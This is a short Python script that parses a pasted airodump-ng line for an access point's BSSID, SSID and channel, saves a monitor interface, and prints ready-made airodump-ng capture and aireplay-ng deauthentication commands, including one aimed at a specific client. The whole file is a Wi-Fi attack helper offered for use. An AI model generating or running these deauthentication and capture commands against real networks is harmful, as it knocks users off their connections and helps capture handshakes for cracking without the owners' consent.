#!/usr/bin/python3
import re
import os.path
import os
derp = input("DUMP your input to start: ")
wifi_interface = 0
ch = 0
L = [derp]
X = '([a-fA-F0-9]{2}[:|\-]?){6}' # this is the regex
bssid = 0
end_ssid = '(\w+)$'
ssid = 0


def main():
    os.system("clear")
    global  wifi_interface
    # Open a file
    fo = open("inter_face.txt", "r+")
    wifi_interface = fo.read()
    # Close opened file
    fo.close()
    strip_bssid()
    strip_ssid()
    get_ch()
    finelpirnt()



def check():
    global wifi_interface
    if  os.path.exists("inter_face.txt")==True:
        # Open a file
        fo = open("inter_face.txt", "r+")
        wifi_interface = fo.read()
        # Close opened file
        fo.close()


        main()

    else:
        print("""
HELLO welcome to first time config.
lets get your wifi interface and save it.
You can delete or mod the inter_face.txt file to reset 
or just set it to what you want...
Anyway
====================
1. wlan0mon
2. wlan1mon
3. mon0
4. mon1
5. wlan0
6. wlan1
U. user defined
====================
Input the Monitor Interface
""")
        do_this = input("choose :")
        if do_this == "1":
            print("setting to wlan0mon")
            wifi_interface = "wlan0mon"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "2":
            print("setting to wlan1mon")
            wifi_interface = "wlan1mon"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()


        elif do_this == "3":
            print("setting to mon0")
            wifi_interface = "mon0"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()


        elif do_this == "4":
            print("setting to mon1")
            wifi_interface = "mon1"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "5":
            print("setting to wlan0")
            wifi_interface = "wlan0"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this == "6":
            print("setting to wlan1")
            wifi_interface = "wlan1"
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        elif do_this in ('U','u'):
            wifi_interface = input("input the mon interface: ")
            # Open a file
            fo = open("inter_face.txt", "w+")
            fo.write(wifi_interface)
            # Close opend file
            fo.close()
            main()

        else:
            print("How could you fuck this up?")
            print("Im done with you.")




def strip_bssid():
    global X
    global L
    global bssid

    for s in L:

        a = re.compile(X).search(s)
        if a:

            bssid = (s[a.start(): a.end()])

def strip_ssid(): ### fix this for replay mac not ssid cuz ssid may have spaces but this is still useful
    global L
    global ssid
    ssid = (derp.split()[-1])


def get_ch():
    global ch
    global derp
    ch_is = (derp.split()[5])
    ch = ch_is







def finelpirnt():
    global bssid,ssid,wifi_interface
    print("""
==========
INFO
==========
""")
    print("WiFi Interface is set to :", wifi_interface)
    print("MAC/BSSID of AP is:",bssid)
    print("SSID of AP is:",ssid)
    print("Commands Generated...")
    print("""
==========
Listening
==========""")

    print("sudo airodump-ng -w",ssid,"--channel",ch,"--bssid",bssid,wifi_interface)
    print("""
========================
Replay Stuff For DeAuth
========================""")
    print("sudo aireplay-ng -0 5 -e",ssid,wifi_interface,"  <===Normal")
    print("sudo aireplay-ng -0 5 -a",bssid,wifi_interface,"  <===If SSID has a Space in it")
    print("sudo aireplay-ng -0 5 -a",bssid,"-c <input target mac here>",wifi_interface,"  <===Hard-Mode")

check()
